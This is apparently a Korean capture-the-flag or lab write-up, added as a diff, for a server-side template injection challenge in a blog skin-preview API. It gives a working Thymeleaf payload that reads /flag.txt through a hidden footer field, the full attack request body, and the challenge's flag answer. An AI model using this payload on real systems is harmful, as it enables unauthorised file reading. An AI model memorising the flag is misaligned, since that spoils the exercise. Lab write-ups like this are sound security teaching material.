@@ -1,0 +1,31 @@
+==========================
+SSTI 2번
+==========================
+
+1. 공격 과정
+  1) 스킨·커버 설정 페이지에서 미리보기 기능을 확인
+  2) 미리보기 버튼 클릭 시 다음 요청이 전송되는 것을 확인
+     POST /practice02/api/v1/skin-previews
+  3) 요청 본문을 확인한 결과 화면에는 coverText 입력칸만 보이지만,
+     실제 요청에는 content와 theme 객체가 함께 전달되는 것을 확인
+  4) theme 객체 안에 화면에서 직접 수정할 수 없는 footer 값이 포함
+     "footer":" EQSTory · 한수쟝"
+  5) footer 값에 Thymeleaf 인라인 표현식을 삽입하여 SSTI 동작 여부를 확인
+     [[${7*7}]] => 49 출력
+  6) footer 값이 서버 템플릿 엔진에서 해석되는 것을 확인한 뒤,
+     Java 파일 처리 클래스를 이용해 /flag.txt 파일을 읽었다.
+     [[${T(java.nio.file.Files).readString(T(java.nio.file.Paths).get('/flag.txt'))}]]
+
+2. 공격 URL, Parameter
+  공격 URL: https://lab.eqst.co.kr:8445/practice02/api/v1/skin-previews
+  Parameter:  theme.footer
+
+3. 공격 구문
+  URL: https://lab.eqst.co.kr:8445/practice02/api/v1/skin-previews
+  Body:
+  {"content":{"title":"병영일기","greeting":"안녕하세요. 한수쟝의 EQSTory입니다.","avatarImageId":null},"theme":{"primaryColor":"#12345f","heroTextColor":"#ffffff","fontKey":"sans","footer":"[[${T(java.nio.file.Files).readString(T(java.nio.file.Paths).get('/flag.txt'))}]]","coverText":"MY STORY, MY SPACE"}}
+
+4. 정답
+  FLAG{hidden_footer_ssti_91870ffe}
+
+==========================
